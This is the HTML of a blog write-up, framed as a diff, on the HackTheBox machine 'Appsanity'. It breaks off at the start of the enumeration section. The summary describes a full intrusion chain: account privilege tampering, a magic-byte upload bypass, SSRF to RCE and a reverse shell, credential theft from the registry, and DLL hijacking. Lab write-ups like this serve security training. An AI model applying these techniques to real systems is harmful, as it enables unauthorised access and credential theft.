@@ -1,0 +1,1912 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Appsanity is a hard difficulty box with a flawed patient registration system. Any user can register as a privileged doctor account by altering the hidden Accttype variable. With a doctor account, the login cookies can be transferred to authenticate on a doctor-only subdomain. In this subdomain, we are able to upload a malicious .aspx file by appending a PDF magic byte to bypass the upload filter. The malicious .aspx file can be accessed by using SSRF techniques on another submission form that allows for website links. Using this method to achieve RCE, we are able to establish a reverse shell onto the system. Once inside, we might find a suspicious custom .dll file. When disassembled, it becomes apparent that a secret credential is stored as a reg key. The reg key is also used as another user&#39;s credentials, which we can now access as well. Lastly for privilege escalation, we might notice an interactive RemoteManagement console is expecting a certain dll, and we can perform DLL hijacking to perform RCE as the Administrator user.'><title>HackTheBox - Appsanity</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-appsanity/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Appsanity'>
+<meta property='og:description' content='Appsanity is a hard difficulty box with a flawed patient registration system. Any user can register as a privileged doctor account by altering the hidden Accttype variable. With a doctor account, the login cookies can be transferred to authenticate on a doctor-only subdomain. In this subdomain, we are able to upload a malicious .aspx file by appending a PDF magic byte to bypass the upload filter. The malicious .aspx file can be accessed by using SSRF techniques on another submission form that allows for website links. Using this method to achieve RCE, we are able to establish a reverse shell onto the system. Once inside, we might find a suspicious custom .dll file. When disassembled, it becomes apparent that a secret credential is stored as a reg key. The reg key is also used as another user&#39;s credentials, which we can now access as well. Lastly for privilege escalation, we might notice an interactive RemoteManagement console is expecting a certain dll, and we can perform DLL hijacking to perform RCE as the Administrator user.'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-appsanity/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Cookie' /><meta property='article:tag' content='Magic Byte' /><meta property='article:tag' content='Upload Bypass' /><meta property='article:tag' content='SSRF' /><meta property='article:tag' content='LFI' /><meta property='article:tag' content='DLL Analysis' /><meta property='article:tag' content='dnSpy' /><meta property='article:tag' content='Exe Analysis' /><meta property='article:tag' content='ProcMon' /><meta property='article:tag' content='DLL Hijack' /><meta property='article:published_time' content='2024-03-09T20:49:21-06:00'/><meta property='article:modified_time' content='2024-03-09T20:49:21-06:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-appsanity/Appsanity.png' />
+<meta name="twitter:title" content="HackTheBox - Appsanity">
+<meta name="twitter:description" content="Appsanity is a hard difficulty box with a flawed patient registration system. Any user can register as a privileged doctor account by altering the hidden Accttype variable. With a doctor account, the login cookies can be transferred to authenticate on a doctor-only subdomain. In this subdomain, we are able to upload a malicious .aspx file by appending a PDF magic byte to bypass the upload filter. The malicious .aspx file can be accessed by using SSRF techniques on another submission form that allows for website links. Using this method to achieve RCE, we are able to establish a reverse shell onto the system. Once inside, we might find a suspicious custom .dll file. When disassembled, it becomes apparent that a secret credential is stored as a reg key. The reg key is also used as another user&#39;s credentials, which we can now access as well. Lastly for privilege escalation, we might notice an interactive RemoteManagement console is expecting a certain dll, and we can perform DLL hijacking to perform RCE as the Administrator user."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-appsanity/Appsanity.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://yuwenmichael.netlify.app/" selected>English</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-appsanity/">
+                <img src="/post/hackthebox-appsanity/Appsanity_hu82f755fa3f9a678df53f9e67501d6a70_337278_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-appsanity/Appsanity_hu82f755fa3f9a678df53f9e67501d6a70_337278_800x0_resize_box_3.png 800w, /post/hackthebox-appsanity/Appsanity_hu82f755fa3f9a678df53f9e67501d6a70_337278_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Appsanity" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-appsanity/">HackTheBox - Appsanity</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Appsanity is a hard difficulty box with a flawed patient registration system. Any user can register as a privileged doctor account by altering the hidden Accttype variable. With a doctor account, the login cookies can be transferred to authenticate on a doctor-only subdomain. In this subdomain, we are able to upload a malicious .aspx file by appending a PDF magic byte to bypass the upload filter. The malicious .aspx file can be accessed by using SSRF techniques on another submission form that allows for website links. Using this method to achieve RCE, we are able to establish a reverse shell onto the system. Once inside, we might find a suspicious custom .dll file. When disassembled, it becomes apparent that a secret credential is stored as a reg key. The reg key is also used as another user&#39;s credentials, which we can now access as well. Lastly for privilege escalation, we might notice an interactive RemoteManagement console is expecting a certain dll, and we can perform DLL hijacking to perform RCE as the Administrator user.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 09, 2024</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration</h2>
+<p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.154.179
+</span></span><span class="line"><span class="cl">Host is up (0.059s latency).
+</span></span><span class="line"><span class="cl">
